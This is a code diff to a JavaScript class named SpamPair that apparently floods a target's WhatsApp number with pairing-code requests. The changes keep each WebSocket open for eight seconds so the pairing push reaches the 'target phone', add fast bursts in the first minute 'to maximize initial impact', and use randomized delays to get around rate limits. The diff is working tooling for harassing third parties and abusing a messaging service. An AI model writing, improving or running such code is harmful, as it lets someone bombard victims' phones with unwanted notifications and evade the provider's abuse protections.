@@ -153,8 +153,17 @@ class SpamPair extends EventEmitter {
               if (codeStr.length >= 6) {
                 this.stats.attempts++;
                 this.stats.success++;
-                cleanup();
-                resolve(true);
+                // CRITICAL: requestPairingCode only returns the 8-digit code.
+                // The actual push notification to the target device and the
+                // encryption handshake happen over the ACTIVE WebSocket connection.
+                // If we kill the socket immediately (cleanup()), the WhatsApp server
+                // can't deliver the push to the target phone.
+                // Keep the socket alive for 8s to allow the push to propagate.
+                console.log(`[SpamPair] 🔄 Keeping socket alive 8s for push delivery...`);
+                setTimeout(() => {
+                  cleanup();
+                  resolve(true);
+                }, 8000);
               } else {
                 // Too short — probably not a real code
                 console.log(`[SpamPair] ⚠️ Short code (${codeStr.length} chars) — might be fake`);
@@ -232,9 +241,13 @@ class SpamPair extends EventEmitter {
       }
 
       // Rate-limit detection
+      const nowElapsed = Date.now() - startTime;
       if (!ok && this.stats.errors > this.stats.success + 3) {
         // Lots of failures — slow down
         await this._sleep(this._randomDelay() + 3000);
+      } else if (nowElapsed < 60000) {
+        // First minute: fast bursts (10-15s) to maximize initial impact
+        await this._sleep(10000 + Math.floor(Math.random() * 5000));
       } else {
         await this._sleep(this._randomDelay());
       }
